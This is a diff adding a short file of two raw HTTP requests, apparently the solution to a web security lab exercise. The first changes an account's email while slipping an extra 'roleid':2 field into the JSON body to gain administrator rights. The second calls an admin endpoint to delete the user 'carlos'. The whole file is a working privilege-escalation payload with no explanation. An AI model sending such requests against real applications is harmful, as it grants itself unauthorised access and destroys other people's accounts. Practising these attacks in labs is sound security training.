@@ -1,0 +1,8 @@
+POST /my-account/change-email HTTP/1.1
+
+{
+"email":"bbbbb@bbbbb",
+"roleid":2
+}
+
+GET /admin/delete?username=carlos HTTP/1.1
